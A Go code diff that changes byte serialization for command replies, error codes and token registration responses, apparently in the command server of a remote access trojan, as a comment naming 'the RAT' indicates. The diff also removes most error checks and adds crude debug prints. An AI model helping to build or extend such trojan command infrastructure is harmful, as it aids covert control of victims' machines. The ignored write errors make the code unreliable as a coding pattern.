@@ -34,13 +34,17 @@ func Write4Bytes(w io.Writer, value uint32) error {
 }
 
 func WriteString(w io.Writer, str string) error {
-    Length := uint32(len(str))
+    Length := uint32(len(str) + 1)
     if err := Write4Bytes(w, Length); err != nil {
         return err
     }
 
     // Write the string bytes
     if _, err := w.Write([]byte(str)); err != nil {
+        return err
+    }
+    if _, err := w.Write([]byte{0}); err != nil {
+        fmt.Println("error writing \\0")
         return err
     }
 
@@ -51,9 +55,7 @@ func WriteString(w io.Writer, str string) error {
 
 func CraftErrorResponse(code uint32) []byte {
     var buf bytes.Buffer
-    if err := Write4Bytes(&buf, code); err != nil {
-        return nil
-    }
+    Write4Bytes(&buf, code)
     return buf.Bytes()
 }
 
@@ -94,20 +96,15 @@ func CraftCommandBytes(cmd *types.CommandReply) []byte {
         var buf bytes.Buffer
 
         // 0 == no error, just makes it easier for the RAT to quickly know if error or not
-        if err := Write4Bytes(&buf, uint32(0)); err != nil {
-        return nil
-        }
-        if err := Write4Bytes(&buf, cmd.CommandID); err != nil {
-            return nil
-        }
-        if err := Write4Bytes(&buf, cmd.CommandCode); err != nil {
-            return nil
-        }
+        Write4Bytes(&buf, uint32(0))
+
+        Write4Bytes(&buf, cmd.CommandID)
+        Write4Bytes(&buf, cmd.CommandCode)
 
         if cmd.Param1 != "" {
                 err := WriteString(&buf, cmd.Param1)
                 if err != nil {
-                    
+                    fmt.Println("error 1")
                     return nil
                 }
         }
@@ -115,7 +112,7 @@ func CraftCommandBytes(cmd *types.CommandReply) []byte {
         if cmd.Param2 != "" {
                 err := WriteString(&buf, cmd.Param2)
                 if err != nil {
-                    
+                    fmt.Println("error 1")
                     return nil
                 }
         }
@@ -167,11 +164,13 @@ func CreateRegisterResponseBytes(Token string, RefreshToken string) []byte {
 	var buf bytes.Buffer
 
 
-	if err := Write4Bytes(&buf, uint32(0));    err != nil { return nil }
+	Write4Bytes(&buf, uint32(0))
 
-	if err := WriteString(&buf, Token);        err != nil { return nil }
+	WriteString(&buf, Token)
 
-    if err := WriteString(&buf, RefreshToken); err != nil { return nil }
+    WriteString(&buf, RefreshToken)
+
+
 	return buf.Bytes()
 
 }
